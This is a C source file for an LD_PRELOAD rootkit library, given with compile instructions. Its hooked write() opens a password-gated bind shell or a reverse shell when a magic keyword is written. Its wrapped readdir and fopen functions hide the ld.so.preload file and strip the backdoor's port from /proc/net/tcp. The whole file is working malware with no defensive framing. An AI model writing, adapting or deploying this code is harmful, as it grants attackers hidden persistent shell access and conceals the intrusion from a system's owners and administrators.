/* Compilation useful macros */
#define _POSIX_C_SOURCE 200809L
#define _LARGEFILE_SOURCE
#define _LARGEFILE64_SOURCE
#define _FILE_OFFSET_BITS 64
#define _ISOC11_SOURCE
#define _GNU_SOURCE

/*------------------------------------------------------------*/
/* COMPILATION INSTRUCTIONS */
/*------------------------------------------------------------*/
 /*
   COMMAND :
       gcc -ansi -Wall -ldl this_file.c -fPIC -shared -o this_file.so

   OPTION DETAILED :
      -ansi :
          For portability.
      - Wall :
          Activate all warning. Recommended for good code writing.
      -ldl :
          Library designation for the linker. It tells the linker to find and
         link a file named libdl.so (or sometimes libdl.a). It has the same
         effect as placing a full path to the library in question in the same
         position of the command line.
    -fPIC :
         Specific set of options used for compilation
   -shared :
         Produce a shared object which can then be linked with other objects
         to form an executable.  Not all systems support this option.  For
         predictable results, you must also specify the same set of options
         used for compilation ('-fpic', '-fPIC', or model suboptions) when
         you specify this linker option.(1)
*/

/*------------------------------------------------------------*/

/*------------------------------------------------------------*/
/* Libraries */
#include <arpa/inet.h> /* For inet_aton, inet_pton definition */
#include <dirent.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
/*------------------------------------------------------------*/
/* Others macros */
/*------------------------------------------------------------*/
/* bind-shell definitions */
#define KEY_4 "notavaliduser4"
#define KEY_6 "notavaliduser6"
#define PASS "password_to_be_defined_areallysecurepassword1234!@#$"
#define LOC_PORT 65065
/*------------------------------------------------------------*/
/* reverse-shell definitions */
/*------------------------------------------------------------*/
#define KEY_R_4 "reverseshell4"
#define KEY_R_6 "reverseshell6"
#define REM_HOST4 "127.0.0.1"
#define REM_HOST6 "::1"
#define REM_PORT 443
#define FILENAME "ld.so.preload" /* filename to hide */
#define KEY_PORT "FE29" /* hex represenation of port to hide for /proc/net/tcp reads */
/*------------------------------------------------------------*/

/* My static variables */
static int count ; /* Declared static as needed in several functions of this file - only. */

/*------------------------------------------------------------*/
/* Functions */
/*------------------------------------------------------------*/

void /* DEBUG previously int */
ipv6_bind (void)
{
    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(LOC_PORT);
    addr.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, IPPROTO_IPV6, IPV6_V6ONLY, &optval, sizeof(optval));

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (count=0 ; count<3 ; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
      /* DEBUG : was before : execve("/bin/sh", NULL, NULL); */
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}

/*------------------------------------------------------------*/

void /* DEBUG previously int */
ipv4_bind (void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (count=0; count<3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
      /* DEBUG : was before : execve("/bin/sh", NULL, NULL); */
      close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}

/*------------------------------------------------------------*/

int
ipv6_rev (void)
{
    const char* host = REM_HOST6;

    struct sockaddr_in6 addr;
    addr.sin6_family = AF_INET6;
    addr.sin6_port = htons(REM_PORT);
    inet_pton(AF_INET6, host, &addr.sin6_addr);

    struct sockaddr_in6 client;
    client.sin6_family = AF_INET6;
    client.sin6_port = htons(LOC_PORT);
    client.sin6_addr = in6addr_any;

    int sockfd = socket(AF_INET6, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (count=0; count<3; count++)
    {
        dup2(sockfd, count);
    }
      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
      /* DEBUG : was before : execve("/bin/sh", NULL, NULL); */
    close(sockfd);

    return 0;
}

/*------------------------------------------------------------*/

int
ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (count=0; count<3; count++)
    {
        dup2(sockfd, count);
    }
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
    /* DEBUG : was before : execve("/bin/sh", NULL, NULL); */
    close(sockfd);

    return 0;
}

/*------------------------------------------------------------*/

ssize_t
write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");


    char *bind4 = strstr(buf, KEY_4);
    char *bind6 = strstr(buf, KEY_6);
    char *rev4 = strstr(buf, KEY_R_4);
    char *rev6 = strstr(buf, KEY_R_6);

    if (bind4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_rev();
    }

    else
    {
        result = new_write(fildes, buf, nbytes);
    }

    return result;
}

/*------------------------------------------------------------*/

struct dirent *(*old_readdir)(DIR *dir);

/*------------------------------------------------------------*/

/* DEBUG PREVIOUSLY
   struct dirent *readdir(DIR *dirp)
*/
struct dirent *__wrap_readdir(DIR *dirp) /* Wrapping the function to enable the assembler of gcc compiler to enable the function rebind. */
{
  /* DEBUG NEW */
    static struct dirent *(*old_readdir)(DIR *dir) = NULL;
    if (!old_readdir)
      {  old_readdir = dlsym(RTLD_NEXT, "readdir");
      }
    /* DEBUG END NEW */
    /* DEBUG PREVIOUSLY
       old_readdir = dlsym(RTLD_NEXT, "readdir");
    */

    struct dirent *dir;

    /* DEBUG PREVIOUSLY
       while (dir = old_readdir(dirp))
    */
    while ((dir = old_readdir(dirp)) != NULL)
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}

/*------------------------------------------------------------*/

struct dirent64 *(*old_readdir64)(DIR *dir);

/*------------------------------------------------------------*/

/* DEBUG PREVIOUSLY
   struct dirent64 *readdir64(DIR *dirp)
*/
struct dirent64 *__wrap_readdir64(DIR *dirp) /* Wrapping the function to enable the assembler of gcc compiler to enable the function rebind. */
{
  /* DEBUG NEW */
   static struct dirent64 *(*old_readdir64)(DIR *dir) = NULL;
   if (!old_readdir64)
     { old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
     }
   /* DEBUG PREVIOUSLY
    old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
   */

    struct dirent64 *dir;
    /* DEBUG PREVIOUSLY
       while (dir = old_readdir64(dirp))
    */
    while ((dir = old_readdir64(dirp)) != NULL)
    {
        if(strstr(dir->d_name,FILENAME) == 0) break;
    }
    return dir;
}

/*------------------------------------------------------------*/

FILE *(*orig_fopen64)(const char *pathname, const char *mode);

/*------------------------------------------------------------*/

/* DEBUG PREVIOUSLY
   FILE *fopen64(const char *pathname, const char *mode)
*/
FILE *__wrap_fopen64(const char *pathname, const char *mode) /* Wrapping the function to enable the assembler of gcc compiler to enable the function rebind. */
{
  /* DEBUG NEW */
  static FILE *(*orig_fopen64)(const char *pathname, const char *mode) = NULL;
     if (!orig_fopen64)
       {  orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
       }
     /* DEBUG PREVIOUSLY
	orig_fopen64 = dlsym(RTLD_NEXT, "fopen64");
     */

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile64();
		fp = orig_fopen64(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;
	}

	fp = orig_fopen64(pathname, mode);
	return fp;
}

/*------------------------------------------------------------*/

FILE *(*orig_fopen)(const char *pathname, const char *mode);

/*------------------------------------------------------------*/

/* DEBUG PREVIOUSLY
   FILE *fopen(const char *pathname, const char *mode)
*/
FILE *__wrap_fopen(const char *pathname, const char *mode)
{
  /* DEBUG NEW */
  static FILE *(*orig_fopen)(const char *pathname, const char *mode) = NULL;
     if (!orig_fopen)
       {   orig_fopen = dlsym(RTLD_NEXT, "fopen");
       }
/* DEBUG PREVIOUSLY
	orig_fopen = dlsym(RTLD_NEXT, "fopen");
*/

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}
/*------------------------------------------------------------*/


